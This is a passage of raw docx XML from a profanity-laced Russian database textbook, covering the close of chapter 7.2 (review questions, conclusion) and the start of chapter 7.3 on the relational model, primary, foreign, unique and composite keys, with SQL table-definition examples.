        <w:t>**DML** — манипуляция данными (SELECT, INSERT, UPDATE, DELETE)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DCL** — контроль доступа (GRANT, REVOKE)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TCL** — управление транзакциями (COMMIT, ROLLBACK)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Трёхуровневая архитектура ANSI-SPARC** — внешний, концептуальный, внутренний уровни</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Внешний уровень** — представления (Views) для пользователей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Концептуальный уровень** — логическая структура БД (таблицы, связи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Внутренний уровень** — физическое хранение (индексы, файлы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Логическая независимость** — изменение концептуальной схемы не влияет на представления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Физическая независимость** — изменение физической структуры не влияет на концептуальную схему</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Реляционная модель** — данные хранятся в таблицах (отношениях)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**NoSQL** — альтернатива реляционным БД (документоориентированные, ключ-значение, колоночные, графовые)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Иерархическая модель** — данные в виде дерева</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сетевая модель** — данные в виде графа (устарела)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Объясни, чем отличается БД от файловой системы. Приведи 3 преимущества БД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Опиши трёхуровневую архитектуру ANSI-SPARC. Что такое логическая и физическая независимость данных?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** Есть таблица `students` с 1 млн записей. Каждая запись занимает 150 байт. Сколько места займут данные? Сколько места займут индексы, если они составляют 25% от данных?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** Придумай ER-диаграмму для библиотеки (сущности: Книга, Автор, Читатель, Аренда). Преобразуй в таблицы с первичными и внешними ключами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** В чём разница между реляционной БД (MySQL) и документоориентированной (MongoDB)? Когда какую лучше использовать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** Есть БД с таблицами `users` (10 млн записей × 200 байт), `posts` (50 млн записей × 500 байт), `comments` (200 млн записей × 100 байт). Оцени размер БД с учётом индексов (30% от данных).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Что такое СУБД? Какие функции она выполняет (DDL, DML, DCL, TCL)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>База данных — это не просто "табличка с данными". Это целая система: от логической структуры (концептуальный уровень) до физического хранения (внутренний уровень), с представлениями для пользователей (внешний уровень). Благодаря трёхуровневой архитектуре можно менять один уровень, не трогая другие — это и есть независимость данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Реляционные БД (MySQL, PostgreSQL) — это стандарт де-факто для 90% задач. Но для специфических случаев (Big Data, гибкие схемы, графы) используют NoSQL (MongoDB, Redis, Neo4j).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Следующая глава — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>7.3 Реляционные БД. Нормализация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — погрузимся глубже в реляционную модель: что такое нормальные формы, как избежать аномалий, и почему нельзя хранить всё в одной таблице.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статус:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Глава готова ✅  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объём:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ~15000 символов  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 10 детальных примеров  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Термины:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 17 ключевых терминов  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 7 контрольных вопросов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 7.3. Реляционные БД. Нормализация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Помнишь главу 7.2, где мы обсуждали, что база данных — это круто, потому что она структурирует данные? Но вот тебе загвоздка: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как именно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> их структурировать? Можно ведь и нахуярить таблиц так, что разработчики будут плакать кровавыми слезами. Представь: у тебя таблица `users` с полями `адрес_дом`, `адрес_улица`, `адрес_город`, `адрес_индекс`, `адрес_страна`, `телефон1`, `телефон2`, `телефон3`, `заказы_список` (где все заказы одной строкой через запятую). Это пиздец, а не проектирование.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Вот для того, чтобы не городить такую хуйню, и придумали </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>реляционную модель данных</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нормализацию</w:t>
      </w:r>
      <w:r>
        <w:t>. Реляционная модель говорит: "Храни данные в таблицах, связывай их через ключи". А нормализация говорит: "Разбей таблицы так, чтобы не было дублирования данных, аномалий и прочего пиздеца".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 7.1 (Инфологическое моделирование)** — ER-диаграммы превращаются в реляционные таблицы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 7.2 (Архитектура БД)** — реляционная модель — это концептуальный уровень</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 4.1 (Жизненный цикл БД)** — нормализация происходит на этапе проектирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3.1. Реляционная модель данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>История</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реляционная модель данных</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> была предложена Эдгаром Коддом (Edgar F. Codd) в 1970 году в статье "A Relational Model of Data for Large Shared Data Banks". До этого были иерархические и сетевые БД, где данные связаны жёсткими указателями, и добавить новую связь — это блять квест. Кодд сказал: "Эй, ребята, давайте хранить данные в таблицах и связывать их через значения ключей, а не через указатели". И это был революционный подход.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Основные понятия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Отношение (Relation)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это таблица. Звучит сложно, но это просто стол с данными.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кортеж (Tuple)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это строка таблицы. Одна запись. Например, один студент.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атрибут (Attribute)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это столбец таблицы. Например, `имя`, `фамилия`, `возраст`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Домен (Domain)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это множество допустимых значений для атрибута. Например, для атрибута `возраст` домен — это целые числа от 0 до 150.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема отношения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это название таблицы + список атрибутов с их типами. Например:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Студент (id: INTEGER, фамилия: VARCHAR(50), имя: VARCHAR(50), возраст: INTEGER)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Степень отношения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — количество атрибутов (столбцов). В примере выше степень = 4.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Мощность отношения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — количество кортежей (строк). Если у нас 100 студентов, мощность = 100.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Свойства отношения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Атомарность значений** — каждое поле содержит только одно значение, а не список.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правильно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: `телефон = "+79991234567"`  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Неправильно</w:t>
      </w:r>
      <w:r>
        <w:t>: `телефоны = "+79991234567, +79097654321"`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уникальность кортежей** — нет двух одинаковых строк. Обеспечивается первичным ключом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Неупорядоченность кортежей** — порядок строк не имеет значения. SQL может вернуть строки в любом порядке, если не указан `ORDER BY`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Неупорядоченность атрибутов** — порядок столбцов не имеет значения (хотя в SQL мы обычно пишем их в определённом порядке).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3.2. Ключи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ключи — это атрибуты, которые однозначно идентифицируют строку или связывают таблицы между собой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Первичный ключ (Primary Key, PK)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Первичный ключ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это атрибут (или набор атрибутов), который </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>однозначно идентифицирует каждую строку</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в таблице.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Требования к первичному ключу:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уникальность**: нет двух строк с одинаковым PK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Неизменность**: значение PK не должно изменяться</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Не NULL**: PK не может быть пустым</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Студент**: `id` (автоинкремент)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Паспорт**: `серия_номер` (уникален по закону)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Пользователь**: `email` (если гарантируется уникальность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суррогатный vs естественный ключ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Суррогатный ключ** — искусственный идентификатор (обычно `id`), не несёт бизнес-смысла.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ✅ Плюсы: стабильный, короткий, легко создать индекс  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ❌ Минусы: нет смысловой нагрузки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Естественный ключ** — атрибут с бизнес-смыслом (`email`, `паспорт`, `ISBN`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ✅ Плюсы: имеет смысл, не нужен дополнительный столбец  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  ❌ Минусы: может измениться, может быть длинным</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Совет:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Используй суррогатные ключи (AUTO_INCREMENT `id`), а естественные делай уникальными индексами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Внешний ключ (Foreign Key, FK)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Внешний ключ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это атрибут, который ссылается на первичный ключ другой таблицы, создавая связь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица студентов</w:t>
        <w:br/>
        <w:t>CREATE TABLE student (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id INT PRIMARY KEY AUTO_INCREMENT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    group_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (group_id) REFERENCES student_group(id)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица групп</w:t>
        <w:br/>
        <w:t>CREATE TABLE student_group (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id INT PRIMARY KEY AUTO_INCREMENT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(20)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Здесь `student.group_id` — это внешний ключ, который ссылается на `student_group.id`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем нужен FK?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Целостность данных**: нельзя добавить студента с `group_id = 999`, если группы с таким `id` не существует</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Каскадные операции**: при удалении группы можно автоматически удалить всех студентов или установить `group_id = NULL`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Каскадные действия:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>FOREIGN KEY (group_id) REFERENCES student_group(id)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ON DELETE CASCADE      -- Удалить студента при удалении группы</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ON UPDATE CASCADE      -- Обновить group_id при изменении id группы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Варианты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`CASCADE` — каскадное изменение/удаление</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`SET NULL` — установить NULL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`RESTRICT` — запретить операцию, если есть зависимые строки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`NO ACTION` — то же, что `RESTRICT`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Уникальный ключ (Unique Key, UK)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уникальный ключ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — атрибут, значения которого должны быть уникальными, но он </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не является первичным ключом</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Отличие от PK:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>UK может быть NULL (хотя и только один раз в большинстве СУБД)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В таблице может быть несколько UK, но только один PK</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE TABLE user (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    email VARCHAR(100) UNIQUE,  -- Уникальный ключ</w:t>
        <w:br/>
        <w:t xml:space="preserve">    phone VARCHAR(20) UNIQUE    -- Ещё один уникальный ключ</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Составной ключ (Composite Key)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Составной ключ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — первичный ключ, состоящий из нескольких атрибутов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример: таблица оценок</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE TABLE grade (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    student_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    course_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    grade INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    date DATE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (student_id, course_id)  -- Составной ключ</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Здесь связь "студент-курс" уникальна, но каждый атрибут по отдельности не уникален.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3.3. Проблемы ненормализованных данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Прежде чем говорить о нормализации, давай посмотрим, какой пиздец случается, если таблицы спроектированы криво.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: плохо спроектированная таблица</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Представь интернет-магазин. Программист-дебил решил сделать так:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE TABLE orders (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_email VARCHAR(100),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_address TEXT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    items TEXT,  -- "Носки, Трусы, Майка"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    prices TEXT  -- "150, 200, 300"</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
